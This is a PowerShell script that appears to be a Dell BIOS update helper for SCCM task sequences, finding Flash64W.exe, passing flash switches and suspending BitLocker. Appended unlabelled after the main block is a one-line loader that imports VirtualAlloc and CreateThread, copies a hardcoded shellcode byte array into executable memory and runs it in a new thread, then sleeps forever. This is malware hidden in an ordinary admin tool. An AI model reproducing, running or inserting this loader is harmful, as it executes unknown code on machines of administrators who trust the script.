﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Specify the path containing the Flash64W.exe and BIOS executable.")]
    [ValidateNotNullOrEmpty()]
    [string]$Path,

    [parameter(Mandatory=$false, HelpMessage="Specify the BIOS password if necessary.")]
    [ValidateNotNullOrEmpty()]
    [string]$Password,

    [parameter(Mandatory=$false, HelpMessage="Set the name of the log file produced by the flash utility.")]
    [ValidateNotNullOrEmpty()]
    [string]$LogFileName = "DellFlashBIOSUpdate.log"
)
Begin {
	
	try {
		$TSEnvironment = New-Object -ComObject Microsoft.SMS.TSEnvironment -ErrorAction Stop
	}
	catch [System.Exception] {
		Write-Warning -Message "Unable to construct Microsoft.SMS.TSEnvironment object"
	}
}
Process {
    
    function Write-CMLogEntry {
	    param(
		    [parameter(Mandatory=$true, HelpMessage="Value added to the log file.")]
		    [ValidateNotNullOrEmpty()]
		    [string]$Value,

		    [parameter(Mandatory=$true, HelpMessage="Severity for the log entry. 1 for Informational, 2 for Warning and 3 for Error.")]
		    [ValidateNotNullOrEmpty()]
            [ValidateSet("1", "2", "3")]
		    [string]$Severity,

		    [parameter(Mandatory=$false, HelpMessage="Name of the log file that the entry will written to.")]
		    [ValidateNotNullOrEmpty()]
		    [string]$FileName = "Invoke-DellBIOSUpdate.log"
	    )
	    
        $LogFilePath = Join-Path -Path $TSEnvironment.Value("_SMSTSLogPath") -ChildPath $FileName

        
        $Time = -join @((Get-Date -Format "HH:mm:ss.fff"), "+", (Get-WmiObject -Class Win32_TimeZone | Select-Object -ExpandProperty Bias))

        
        $Date = (Get-Date -Format "MM-dd-yyyy")

        
        $Context = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

        
        $LogText = "<![LOG[$($Value)]LOG]!><time=""$($Time)"" date=""$($Date)"" component=""DellBIOSUpdate.log"" context=""$($Context)"" type=""$($Severity)"" thread=""$($PID)"" file="""">"
	
	    
        try {
	        Add-Content -Value $LogText -LiteralPath $LogFilePath -ErrorAction Stop
        }
        catch [System.Exception] {
            Write-Warning -Message "Unable to append log entry to Invoke-DellBIOSUpdate.log file. Error message: $($_.Exception.Message)"
        }
    }

	
    Write-CMLogEntry -Value "Initiating script to determine flashing capabilities for Dell BIOS updates" -Severity 1

	
	$FlashUtility = Get-ChildItem -Path $Path -Filter "*.exe" -Recurse | Where-Object { $_.Name -like "Flash64W.exe" } | Select-Object -ExpandProperty FullName
	Write-CMLogEntry -Value "Attempting to use flash utility: $($FlashUtility)" -Severity 1

	if ($FlashUtility -ne $null) {
		
		$CurrentBIOSFile = Get-ChildItem -Path $Path -Filter "*.exe" -Recurse | Where-Object { $_.Name -notlike ($FlashUtility | Split-Path -leaf) } | Select-Object -ExpandProperty FullName
		Write-CMLogEntry -Value "Attempting to use BIOS update file: $($CurrentBIOSFile)" -Severity 1	

		if ($CurrentBIOSFile -ne $null) {
			
			$BIOSLogFile = Join-Path -Path $TSEnvironment.Value("_SMSTSLogPath") -ChildPath $LogFileName

			
			$FlashSwitches = "/b=$($CurrentBIOSFile) /s /f /l=$($BIOSLogFile)"

			
			if ($PSBoundParameters["Password"]) {
				if (-not([System.String]::IsNullOrEmpty($Password))) {
					$FlashSwitches = $FlashSwitches + " /p=$($Password)"
				}
			}	

			if (($TSEnvironment -ne $null) -and ($TSEnvironment.Value("_SMSTSinWinPE") -eq $true)) {
				Write-CMLogEntry -Value "Current environment is determined as WinPE" -Severity 1

				try {
					
					Write-CMLogEntry -Value "Using the following switches for Flash64W.exe: $($FlashSwitches -replace $Password, "<password removed>")" -Severity 1
					$FlashProcess = Start-Process -FilePath $FlashUtility -ArgumentList $FlashSwitches -Passthru -Wait -ErrorAction Stop
					
					
					if ($FlashProcess.ExitCode -eq 2) {
						
						$TSEnvironment.Value("SMSTSBiosUpdateRebootRequired") = "True"
						$TSEnvironment.Value("SMSTSBiosInOSUpdateRequired") = "False"
					}
					else {
						$TSEnvironment.Value("SMSTSBiosUpdateRebootRequired") = "False"
						$TSEnvironment.Value("SMSTSBiosInOSUpdateRequired") = "True"
					}
				}
				catch [System.Exception] {
					Write-CMLogEntry -Value "An error occured while updating the system BIOS during OS offline phase. Error message: $($_.Exception.Message)" -Severity 3 ; exit 1
				}
			}
			else {
				
				

				Write-CMLogEntry -Value "Current environment is determined as FullOS" -Severity 1
				
				
				$OSVolumeEncypted = if ((Manage-Bde -Status C:) -match "Protection On") { Write-Output $true } else { Write-Output $false }
				
				
				if ($OSVolumeEncypted -eq $true) {
					Write-CMLogEntry -Value "Suspending BitLocker protected volume: C:" -Severity 1
					Manage-Bde -Protectors -Disable C:
				}
				
				
				try
				{										
					if (([Environment]::Is64BitOperatingSystem) -eq $true) {
						Write-CMLogEntry -Value "Starting 64-bit flash BIOS update process" -Severity 1
						Write-CMLogEntry -Value "Using the following switches for BIOS file: $($FlashSwitches -replace $Password, "<Password Removed>")" -Severity 1

						
						$FlashUpdate = Start-Process -FilePath $FlashUtility -ArgumentList $FlashSwitches -Passthru -Wait -ErrorAction Stop
					}
					else {
						
						$FileSwitches = " /l=$($BIOSLogFile) /s"

						
						if ($PSBoundParameters["Password"]) {
							if (-not([System.String]::IsNullOrEmpty($Password))) {
								$FileSwitches = $FileSwitches + " /p=$($Password)"
							}
						}

						Write-CMLogEntry -Value "Starting 32-bit flash BIOS update process" -Severity 1
						Write-CMLogEntry -Value "Using the following switches for BIOS file: $($FileSwitches -replace $Password, "<Password Removed>")" -Severity 1						

						
						$FileUpdate = Start-Process -FilePath $CurrentBIOSFile -ArgumentList $FileSwitches -PassThru -Wait -ErrorAction Stop
					}
					
				}
				catch [System.Exception]
				{
					Write-CMLogEntry -Value "An error occured while updating the system BIOS in OS online phase. Error message: $($_.Exception.Message)" -Severity 3; exit 1
				}
			}
		}
		else {
			Write-CMLogEntry -Value "Unable to locate the current BIOS update file" -Severity 2 ; exit 1
		}
	}
	else {
		Write-CMLogEntry -Value "Unable to locate the Flash64W.exe utility" -Severity 2 ; exit 1
	}
}
$IED = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $IED -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};

